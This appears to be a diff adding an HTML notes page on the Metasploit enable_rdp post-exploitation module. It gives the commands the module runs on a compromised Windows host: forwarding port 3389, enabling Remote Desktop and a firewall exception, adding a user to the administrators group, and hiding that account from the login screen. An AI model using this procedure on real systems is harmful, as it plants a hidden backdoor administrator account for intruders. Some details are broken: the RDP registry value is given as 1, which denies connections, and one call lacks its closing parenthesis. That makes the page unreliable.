@@ -1,0 +1,41 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>post module: enable_rdp / Getgui</title>
+</head><body>getgui is deprecated, use the post module! post/windows/manage/enable_rdp from MSF prompt, NOT meterpreter<br/>
+<br/>
+Need Administrator Privileges!<br/>
+<br/>
+options:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; OptString.new('USERNAME', [ false, 'The username of the user to create.' ]),<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; OptString.new('PASSWORD', [ false, 'Password for the user created.' ]),<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; OptBool.new('ENABLE', [ false, 'Enable the RDP Service and Firewall Exception.', true]),<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; OptBool.new('FORWARD', [ false, 'Forward remote port 3389 to local Port.', false]),<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; OptInt.new('LPORT', [ false, 'Local port to forward remote connection.', 3389])<br/>
+<br/>
+Portforward done using the portfwd command<br/>
+portfwd add -L 0.0.0.0 -l #{datastore['LPORT']} -p 3389 -r 127.0.0.1<br/>
+<br/>
+Enabled with reg key:<br/>
+reg setval -k \'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\' -v 'fDenyTSConnections' -d \"1\"<br/>
+<br/>
+Set service: termservice to START_TYPE_AUTO<br/>
+<br/>
+Allow through the firewall<br/>
+'netsh', 'firewall set service type = remotedesktop mode = enable', 30<br/>
+<br/>
+Check for remote desktop users group and admin group<ul><li style="list-style-type: none">rdu_sid = resolve_sid("S-1-5-32-555")</li>
+<li style="list-style-type: none">admin_sid = resolve_sid("S-1-5-32-544")</li>
+</ul>
+And add new user to the groups<br/>
+"cmd.exe", "/c net localgroup \"#{rdu}\" #{username} /add"<br/>
+"cmd.exe", "/c net localgroup #{admin} &nbsp;#{username} /add"<br/>
+<br/>
+Hide user from the Windows Login screen<br/>
+hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'<br/>
+registry_setvaldata(hide_user_key, username, 0, "REG_DWORD"<br/>
+<br/>
+post module creates a cleanup script to delete added values and user<br/>
+<br/>
+You should be able to log into the machine with rdesktop or other RDP utility</body></html>
